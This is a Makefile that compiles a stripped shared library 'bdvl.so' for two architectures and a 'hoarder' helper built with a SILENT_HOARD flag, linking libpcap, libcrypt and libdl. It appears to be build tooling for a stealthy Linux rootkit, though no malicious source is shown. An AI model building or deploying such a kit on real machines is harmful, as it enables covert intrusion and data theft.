WARNING_FLAGS+=-Wall
OPTION_FLAGS+=-fPIC -fomit-frame-pointer
R_LFLAGS+=-lc -ldl -lcrypt -lpcap
PLATFORM+=$(shell uname -m)
SONAME+=bdvl.so
INC+=inc

all: hoarder setup kit

hoarder:
	rm -f etc/hoarder
	$(CC) etc/hoarder.c $(WARNING_FLAGS) -DSILENT_HOARD -DMAX_THREADS=30 -lpthread -o etc/hoarder
	strip etc/hoarder

setup:
	mkdir -p ./build
	python setup.py

kit: $(INC)/bdv.c
	$(CC) -std=gnu99 -g $(OPTION_FLAGS) $(WARNING_FLAGS) -I$(INC) -shared -Wl,--build-id=none $(INC)/bdv.c $(R_LFLAGS) -o build/$(SONAME).$(PLATFORM)
	-$(CC) -m32 -std=gnu99 -g $(OPTION_FLAGS) $(WARNING_FLAGS) -I$(INC) -shared -Wl,--build-id=none $(INC)/bdv.c $(R_LFLAGS) -o build/$(SONAME).i686
	strip build/$(SONAME)*

clean:
	rm -f etc/hoarder
	rm -rf build/$(SONAME)* $(INC)/config.h
	echo '/* setup.py territory */' > $(INC)/bdv.h

cleanall: clean
	rm -rf build